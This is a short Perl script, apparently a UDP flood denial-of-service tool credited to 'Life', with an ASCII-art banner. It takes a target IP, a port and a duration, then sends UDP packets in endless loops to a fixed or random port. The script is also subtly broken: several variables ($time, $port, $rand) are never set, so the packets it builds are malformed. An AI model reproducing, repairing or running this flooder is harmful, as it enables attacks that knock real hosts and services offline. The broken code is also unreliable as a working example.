#!/usr/bin/perl
use Socket;
$ARGC=@ARGV;
if ($ARGC !=3) {
printf "Wrong command, use: perl ady <ip> <port> <time> \n";
exit(1);
}
my ($ip);
$ip=$ARGV[0];
socket(crazy, PF_INET, SOCK_DGRAM, 17);
$iaddr = inet_aton("$ip");

printf "\n";
print <<EOTEXT;
[1;31m
              : By [Life] :

                                                                                                    
                                                                                     
.dd/         -mmy    -hddddddddh.                                             
-MMo         `os:    /MMs++++++/`                                            
-MMo          ..`    /MM:             `.---.`                                 
-MMo          NNo    /MM:           -ydddddmdo`                               
-MMo         `MMs    /MM+.......   +NN+.```-hMd`                              
-MMo         `MMs    /MMmmmmmmmy  .NMs......:MM+                              
-MMo         `MMs    /MM+......`  /MMmhhhhhhhmm+                              
-MMo         `MMs    /MM:         :MM+........`                               
-MMo         `MMs    /MM:         `dMd.      ``                               
-MMmhhhhyyy. `MMs    /MM:          .hNNyo++oyhh                               
`+ooooooooo`  oo:    .oo.            -/osyys+/.                               
                                                                             

EOTEXT

if ($ARGV[1] ==0 && $ARGV[2] ==0) {
goto randpackets;
}
if ($ARGV[1] !=0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &");
goto packets;
}
if ($ARGV[1] !=0 && $ARGV[2] ==0) {
goto packets;
}
if ($ARGV[1] ==0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &"); 
goto randpackets;
}
packets:
for (;;) {
$size=$rand x $rand x $rand;
send(crazy, 8, $size, sockaddr_in($port, $iaddr));
}
randpackets:
for (;;) {
$size=$rand x $rand x $rand;
$port=int(rand 75000) +0;
send(crazy, 0, $size, sockaddr_in($port, $iaddr));
}
